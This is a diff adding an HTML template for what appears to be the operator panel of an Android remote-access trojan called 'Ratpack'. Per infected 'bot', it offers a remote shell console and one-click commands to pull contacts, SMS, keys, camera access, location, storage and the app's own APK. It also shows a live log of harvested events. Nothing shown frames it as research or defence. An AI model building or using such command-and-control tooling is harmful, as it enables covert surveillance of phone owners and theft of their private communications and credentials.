@@ -1,0 +1,63 @@
+{% extends "base.html" %}
+{% block title %}Ratpack — bot {{ bot.id if bot else '?' }}{% endblock %}
+
+{% block content %}
+<p><a href="/">&larr; all bots</a></p>
+
+{% if not bot %}
+<div class="alert">bot not found</div>
+{% else %}
+<div class="row">
+    <div class="card grow">
+        <h2>{{ bot.info.get('brand','') }} {{ bot.info.get('model','') }}</h2>
+        <table class="kv">
+            {% for k, v in bot.info.items() %}
+            <tr><th>{{ k }}</th><td>{{ v }}</td></tr>
+            {% endfor %}
+        </table>
+    </div>
+
+    <div class="card">
+        <h2>Console</h2>
+        <form method="get" class="cmdform">
+            <input type="hidden" name="cmd" value="shell">
+            <input type="text" name="argument" placeholder="command / path" autofocus>
+            <button type="submit">Run</button>
+        </form>
+        <div class="quick">
+            <a href="?cmd=info">info</a>
+            <a href="?cmd=contacts">contacts</a>
+            <a href="?cmd=sms">sms</a>
+            <a href="?cmd=keys">keys</a>
+            <a href="?cmd=roots">roots</a>
+            <a href="?cmd=cameras">cameras</a>
+            <a href="?cmd=caches">caches</a>
+            <a href="?cmd=storage">storage</a>
+            <a href="?cmd=settings">settings</a>
+            <a href="?cmd=location">location</a>
+            <a href="?cmd=selfapk">selfapk</a>
+            <a href="?cmd=ls&amp;argument=/sdcard">ls /sdcard</a>
+        </div>
+        <pre>{{ output }}</pre>
+    </div>
+</div>
+
+<div class="card">
+    <h2>Event log <span class="muted">({{ events|length }})</span></h2>
+    {% for e in events %}
+    <div class="event">
+        <span class="tag">{{ e.get('kind','') }}</span>
+        <pre>{{ e.get('data',{})|tojson(indent=1) }}</pre>
+    </div>
+    {% else %}
+    <p class="muted">no events yet</p>
+    {% endfor %}
+</div>
+{% endif %}
+{% endblock %}
+
+{% block scripts %}
+<script>
+setInterval(function () { location.reload(); }, 5000);
+</script>
+{% endblock %}
